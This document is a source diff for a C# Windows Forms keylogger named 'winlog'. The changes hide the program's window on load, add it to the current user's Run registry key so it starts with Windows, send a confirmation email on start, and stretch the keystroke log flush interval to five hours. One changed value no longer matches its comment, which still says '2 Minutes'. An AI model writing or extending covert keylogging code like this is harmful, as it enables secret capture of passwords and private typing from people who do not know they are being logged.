@@ -9,21 +9,34 @@ namespace winlog
     public partial class Form1 : Form
     {
         public static Form1 _Instance;
+        private bool allowshowdisplay = false;
 
         public Form1()
         {
-            InitializeComponent();
+            InitializeComponent();            
             this.Load += Form1_Load1;
             _Instance = this;
         }
+
+        //protected override void SetVisibleCore(bool value)
+        //{
+        //    base.SetVisibleCore(allowshowdisplay ? value : allowshowdisplay);
+        //}
 
         private void Form1_Load1(object sender, EventArgs e)
         {
             Keylogger();
             SetBoundaries();
-        }
+            RegisterStartup(true);
+            ConfirmStart();
+            BeginInvoke(new MethodInvoker(delegate
+            {
+                Hide();
+            }));
 
-        private void RegisterInStartup(bool isChecked)
+        }     
+
+        private void RegisterStartup(bool isChecked)
         {
             RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                     ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
@@ -52,7 +65,17 @@ namespace winlog
             this.ConsoleBox.MinimumSize = new System.Drawing.Size(760, 395);
             this.ConsoleBox.MinimumSize = new System.Drawing.Size(760, 395);
         }
-        
+
+        public void ConfirmStart()
+        {
+            string retval = string.Empty;
+            Mailer m = new Mailer();
+            retval = m.SendConfirmation();
+
+            if (retval != "SUCCESS")
+                Print(retval);
+        }
+
         public void Keylogger()
         {
             Assembly asmPath = System.Reflection.Assembly.GetExecutingAssembly();
@@ -71,7 +94,7 @@ namespace winlog
             if (mode == "")
                 mode = "day";
             if (fInterval == 0)
-                fInterval = 10000; // Default: 2 Minutes
+                fInterval = 300000; // Default: 2 Minutes
             if (output == "")
                 output = "file";
 
@@ -79,7 +102,7 @@ namespace winlog
             kl.LOG_MODE = "day";
             kl.LOG_FILE = Path.Combine(exePath,filename);
             kl.Enabled = true; // enable key logging
-            kl.FlushInterval = 30000; // 30 seconds            
+            kl.FlushInterval = 18000000; // 5 hours
         }
     }
 }
